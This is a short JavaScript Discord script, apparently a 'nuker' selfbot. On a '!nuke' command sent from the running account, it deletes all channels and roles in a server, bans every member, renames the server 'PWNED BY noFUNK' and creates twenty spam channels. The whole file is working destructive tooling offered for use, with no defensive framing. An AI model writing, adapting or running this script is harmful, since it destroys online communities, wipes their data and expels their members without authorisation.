const discord = require('discord.js')
const client = new discord.Client()
const token = ''

client.on('ready', () => {
    console.log('Online' + client.user.username)
})


client.on('message', (msg) => {
    if (msg.author.id === client.user.id) {

        if (msg.content === '!nuke') {
            let server = msg.guild
            server.channels.forEach(channel => channel.delete() && console.log('[CHANNEL] ' + channel.name))
            server.roles.forEach(role => role.delete() && console.log('[ROLE] ' + role.name))
            server.fetchMembers().then(r => {
                r.members.array().forEach(r => {
                    if (r.user.username !== client.user.username) {
                    r.ban()
                    console.log(`Banned ${r.user.username}#${r.user.discriminator}`)
                    }
                })
            })
            server.setName('PWNED BY noFUNK')
            var i;
            for (i = 0; i < 20; i++) {
                server.createChannel('pwned by noFUNK v1.0', { type: 'text'})
            }
        }

    }
})
